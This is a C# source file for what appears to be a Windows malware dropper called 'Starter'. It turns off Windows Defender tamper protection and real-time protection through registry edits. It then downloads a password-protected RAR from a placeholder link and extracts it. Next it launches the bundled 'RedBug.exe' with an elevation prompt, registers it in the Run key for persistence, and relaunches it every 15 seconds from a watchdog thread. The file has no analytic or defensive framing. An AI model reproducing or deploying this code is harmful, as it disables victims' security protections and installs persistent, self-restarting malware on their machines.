using Microsoft.Win32;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;



namespace Starter
{
    internal static class Program
    {
        [STAThread]
        static void Main()
        {
            Disable();
            install();

            void c()
            {
                while (true)
                {
                    try
                    {
                        Task.Delay(15000).Wait();
                        KeepAlive();
                    }
                    catch { }
                }
            }
            new Thread(() => { c(); }).Start(); 

            ApplicationConfiguration.Initialize();
            Application.Run();
        }



        public static void KeepAlive()
        {
            var processes = Process.GetProcessesByName("RedBug");

            if (processes.Length == 0)
            {
                string path = $@"C:\Users\{Environment.UserName}\Desktop\RedBug.exe";

                if (File.Exists(path))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = path,
                        UseShellExecute = true
                    });
                }
            }
        }

        public static void Disable()
        {

            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                //
            }

            else
            {
                RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0");
                RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
                RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
                RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
                RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
            }


        }

        public static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch
            {

                // asag
            }
        }



        public static void DownloadFile(string url, string fileName)
        {
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string filePath = Path.Combine(desktop, fileName);

            using (WebClient client = new WebClient())
            {
                client.DownloadFile(url, filePath);
            }

        }
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        
        public static void ExtractRAR(string rarPath, string password)
        {
            string winrarPath = @"C:\Program Files\WinRAR\WinRAR.exe";

            if (!System.IO.File.Exists(winrarPath))
            {
                return;
            }

            if (!System.IO.File.Exists(rarPath))
            {
                return;
            }

            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = winrarPath,
                Arguments = $"x -p{password} \"{rarPath}\" \"{desktop}\\\"",
                UseShellExecute = false,
                CreateNoWindow = true
            };

            Process.Start(psi).WaitForExit();
        }

        public static void RunAsAdmin(string filePath, string args = "")
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = filePath,
                Arguments = args,
                UseShellExecute = true,
                Verb = "runas"
            };

            try
            {
                Process.Start(psi);
            }
            catch (System.ComponentModel.Win32Exception)
            {
                ProcessStartInfo psi2 = new ProcessStartInfo
                {
                    FileName = filePath,
                    Arguments = args
                };
                Process.Start(psi);

            }
        }

        public static void install()
        {
            DownloadFile("DOWNLOAD LINK DIRECT", "ascas.rar");
            ExtractRAR(@"C:\Users\" + Environment.UserName + @"\Desktop\ascas.rar", "1606");
            RunAsAdmin(@"C:\Users\" + Environment.UserName + @"\Desktop\RedBug.exe");
            Add();
        }
        public static void Add()
        {
            string exePath = @"C:\Users\" + Environment.UserName + @"\Desktop\RedBug.exe";
            string appName = Path.GetFileNameWithoutExtension(exePath);

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run", true))
            {
                if (key == null)
                    throw new Exception("Run registry key not found");

                var existing = key.GetValue(appName);

                if (existing != null && existing.ToString() == exePath)
                    return;

                key.SetValue(appName, $"\"{exePath}\"", RegistryValueKind.String);
            }
        }
    }
}
